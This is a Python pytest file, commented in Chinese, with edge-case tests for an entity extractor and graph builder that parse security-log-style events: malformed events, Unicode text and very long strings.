class TestEdgeCases:
    """边界情况测试"""
    
    def test_malformed_events(self):
        """测试格式错误的事件"""
        extractor = EntityExtractor()
        builder = EntityGraphBuilder()
        
        malformed_events = [
            {},  # 完全空的事件
            {"@timestamp": None},  # 时间戳为None
            {"source": "not_a_dict"},  # 格式错误
            {"process": {"name": None}},  # 值为None
        ]
        
        for event in malformed_events:
            # 应该不抛出异常，而是优雅处理
            try:
                entities = extractor.extract(event)
                graph = builder.build([event])
                assert isinstance(entities, list)
                assert isinstance(graph, dict)
            except Exception as e:
                # 如果抛出异常，应该是预期的错误类型
                assert isinstance(e, (KeyError, TypeError, AttributeError))
    
    def test_unicode_characters(self):
        """测试Unicode字符处理"""
        event = {
            "@timestamp": "2024-01-01T10:00:00Z",
            "process": {
                "pid": 1234,
                "name": "测试进程",
                "command_line": "echo '你好世界'"
            },
            "file": {"path": "/tmp/测试文件.txt"},
            "user": {"name": "用户@domain"},
            "event": {"category": "process"}
        }
        
        extractor = EntityExtractor()
        entities = extractor.extract(event)
        
        # 应该正确处理Unicode字符
        assert len(entities) > 0
    
    def test_very_long_strings(self):
        """测试超长字符串"""
        long_string = "A" * 10000
        event = {
            "@timestamp": "2024-01-01T10:00:00Z",
            "process": {
                "pid": 1234,
                "name": "test",
                "command_line": long_string
            },
            "event": {"category": "process"}
        }
        
        extractor = EntityExtractor()
        entities = extractor.extract(event)
        
        # 应该能处理超长字符串
        assert len(entities) > 0


# ============================================
# 主函数 - 运行所有测试
# ============================================

if __name__ == "__main__":
    print("=" * 60)
    print("组员4模块测试 - 开始运行")
    print("=" * 60)
    
    # 运行pytest
    pytest.main([__file__, "-v", "--tb=short"])
    
    print("\n" + "=" * 60)
    print("测试完成！")
    print("=" * 60)
